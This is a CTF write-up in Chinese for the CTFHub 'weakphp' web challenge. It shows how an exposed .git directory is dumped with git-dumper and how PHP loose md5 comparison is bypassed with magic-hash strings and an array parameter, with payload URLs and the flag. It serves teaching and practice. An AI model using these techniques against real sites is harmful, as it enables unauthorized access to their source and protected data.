---
layout: null
---

### 题目名称：weakphp

题目来源：CTFHub（原题：2017-赛客夏令营-Web-weakphp）

题目类别：Web

题目描述：

### 解题思路

访问根目录直接 302 到 index.php?user=1&pass=2，带上这组参数也只返回 nonono!。先按登录题的路子试注入，单引号、双引号、or 1=1、注释符全试了一遍，返回都是 nonono!，既没有报错也没有长度变化，说明参数没有进 SQL。转去翻文件，发现 .git/HEAD 能访问，整个 .git 被部署到了线上。

把仓库拉下来读源码，看到 index.php 的逻辑：先 require_once "flag.php"，然后比较 md5($user) == md5($pass) 并且 $user != $pass，两个条件都满足就输出 flag。这里用的是两个等号的松散比较，两个 0e 开头的 md5 会被当成数字 0，0 == 0 成立，而两个原串本身又不一样，所以能同时满足两个条件。

### 详细步骤

1. 访问根目录，302 到 index.php?user=1&pass=2，带上参数返回 nonono!

2. 试注入。单引号、双引号、or 1=1、-- -、# 都返回 nonono!，没有报错，说明不是注入

3. 试文件，发现 /.git/HEAD 返回 200

    ```
    ref: refs/heads/master
    ```

    说明 .git 被部署到了线上

4. 用 git-dumper 把仓库拉下来

    ```bash
    git-dumper 'http://challenge-a447ed04306fe50b.sandbox.ctfhub.com:10800/' gitdump
    ```

    这次拉到三个对象：一个 commit、一个 tree、一个 blob

5. 机器上没装 git 也不影响，对象文件就是 zlib 压缩，Python 就能读

    ```python
    import zlib
    data = zlib.decompress(open(path, 'rb').read())
    head, _, body = data.partition(b'\x00')
    print(body.decode())
    ```

6. blob 就是 index.php 的源码

    ```php
    <?php
    require_once "flag.php";
    if (!isset($_GET['user']) && !isset($_GET['pass'])) {
        header("Location: index.php?user=1&pass=2");
    }

    $user = $_GET['user'];
    $pass = $_GET['pass'];
    if ((md5($user) == md5($pass)) and ($user != $pass)){
        echo $flag;
    } else {
        echo "nonono!";
    }
    ?>
    ```

7. 从源码看，要满足 md5 相等但原串不等。用魔法哈希，这两个串的 md5 都是 0e 开头

    ```
    md5('QNKCDZO')   = 0e830400451993494058024219903391
    md5('240610708') = 0e462097431906509019562988736854
    ```

    两个都是 0e 后面跟纯数字，松散比较时会被当成科学计数法 0 乘 10 的 n 次方，两边都等于 0，所以相等

8. 带上这两个值请求

    ```
    ?user=QNKCDZO&pass=240610708
    ```

    返回值就是 ctfhub{33d1d51f47afb2a7200c99f1}，获得flag

### Payload

```
GET /index.php?user=QNKCDZO&pass=240610708 HTTP/1.1
```

完整地址

```
http://challenge-a447ed04306fe50b.sandbox.ctfhub.com:10800/index.php?user=QNKCDZO&pass=240610708
```

另外两种等价的写法，实测都能出 flag

```
/index.php?user=s878926199a&pass=s155964671a
/index.php?user[]=1&pass[]=2
```

数组那条的原理不一样：传数组时 md5() 会报错并返回 null，两边都是 null，null 等于 null 成立；而两个数组内容不同，$user != $pass 也成立

### flag

ctfhub{33d1d51f47afb2a7200c99f1}

### 总结&反思

本题又是一个新的看源码的操作，要学的还是太多了。
